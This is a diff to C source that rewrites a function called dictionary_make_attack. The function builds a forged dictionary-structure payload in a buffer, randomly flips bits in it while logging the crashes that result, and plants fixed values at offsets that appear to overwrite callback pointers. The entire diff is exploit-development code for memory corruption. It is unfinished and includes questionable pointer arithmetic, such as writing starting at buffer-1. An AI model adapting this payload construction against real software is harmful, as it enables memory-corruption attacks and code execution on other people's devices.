@@ -39,14 +39,62 @@ void dictionary_free(dictionary_t* dict) {
 	}
 }
 
-int dictionary_make_attack(uint32_t address, char** data, int* length) {
+int dictionary_make_attack(uint32_t address, uint32_t salt, char** data, int* length) {
+	int i = 0;
+	int size = 0x40;
+	int bits = 0x10 * 8;
+	unsigned char* buffer = (unsigned char*) malloc(size+1);
+	unsigned int* ibuffer = (unsigned int*) (buffer-1);
+	int count = 20;
 
+
+	//printf("\n\n%p %p\n\n", buffer, ibuffer);
+	if(buffer) {
+		//memset(buffer-1, '\0', size+2);
+		memset(buffer, '\1', size);
+
+		for(i = 0; i < count; i++) {
+			// Here we're going to flip some bits and record the type of crash we get
+			int bit = random() % bits; // returns a number 0x0 to size * 8
+			//debug("Bit = %d\n", bit);
+			int index = bit/8; // returns the byte index of the bit we're going to change
+			//debug("Index = 0x%02x\n", index);
+
+			//debug("Original byte found was 0x%x\n", buffer[index]);
+
+			int shift = bit - (index*8); // the index of the bit from the byte
+			//debug("Shift = %d\n", shift);
+			char bit_mask = 1 << shift;
+			//debug("BitMask = 0x%x\n\n", bit_mask);
+			buffer[index] ^= bit_mask;
+			//debug("New byte is 0x%x\n", buffer[index]);
+			buffer[index] &= ~0x80;
+			if(buffer[index] == 0 || buffer[index] > 0x7F) buffer[index] = 1;
+		}
+
+		ibuffer[4] = 0x3F202020;
+		ibuffer[5] = 0x3F202020;
+		ibuffer[6] = 0x3F303030;
+		//ibuffer[7] = 0x3F0a0b0c;
+		//ibuffer[8] = 0x3F0d0e0f;
+	}
+	int j = 0;
+	for(j = 0; j < size; j++) {
+		if(j != 0 && ((j % 0x10) == 0)) debug("\n");
+		debug("%02x ", buffer[j]);
+	} debug("\n\n");
+	*data = buffer;
+	*length = size;
+	return 0;
+}
+
+	/*
 	int size = 0x40;
 	unsigned char* buffer = malloc(size);
 	memset(buffer, '\0', size);
 	dictionary_t* ht = (dictionary_t*) buffer;
 
-	uint32_t flags = DICTIONARY_LINEAR_HASHING | DICTIONARY_HAS_KEYS | DICTIONARY_HAS_COUNTS;
+	uint32_t flags = DICTIONARY_LINEAR_HASHING | DICTIONARY_HAS_KEYS | DICTIONARY_HAS_COUNTS | DICTIONARY_HAS_HASHCACHE;
 	//flags |= kCFBasicHashAggressiveGrowth | kCFBasicHashHasKeys |  | kCFBasicHashHasHashCache;
 	//ht->_cfisa = 0x3fdec0c0;
 	//ht->_cfinfo = 0x0100078c;
@@ -72,10 +120,21 @@ int dictionary_make_attack(uint32_t address, char** data, int* length) {
     ht->bits.hashes_offset = (flags & DICTIONARY_HAS_HASHCACHE) ? 1 : 0;
 
 
-    ht->callbacks = 0x36010100;
-    ht->pointers[0] = 0x37010100;
-    ht->pointers[1] = 0x37010100;
-    ht->pointers[2] = 0x37010100;
+    int i = 0;
+    //0x3f40100c
+    int sz = 0x20;
+    uint32_t value = 0x3F202020;//address;
+    unsigned char* addr = &value;
+   unsigned char* target = &(ht->callbacks);
+   target -= 5;
+    for(i = 0; i < sz; i += 4) {
+       target[i+0] = addr[0];
+       target[i+1] = addr[1];
+      target[i+2] = addr[2];
+      target[i+3] = addr[3];
+      debug("ht->callbacks = 0x%08x\n", ht->callbacks);
+    }
+
 
     // overrides
     //buffer[11] = 0x01;
@@ -101,7 +160,7 @@ int dictionary_make_attack(uint32_t address, char** data, int* length) {
     printf("ht->bits.mutations = %d\n", ht->bits.mutations);
 printf("\n");
 
-	int i = 0;
+	//int i = 0;
 	int j = 1;
 	for(i = 0; i < size; i++) {
 		if((i % 0x10) == 0 && i != 0) printf("\n");
@@ -144,6 +203,7 @@ printf("\n");
 	return 0;
 }
 
+	*/
 void dictionary_debug(dictionary_t* dict) {
 	printf("dict->bits.hash_style = %d\n", dict->bits.hash_style);
 	printf("dict->bits.values2_offset = %d\n", dict->bits.values2_offset);
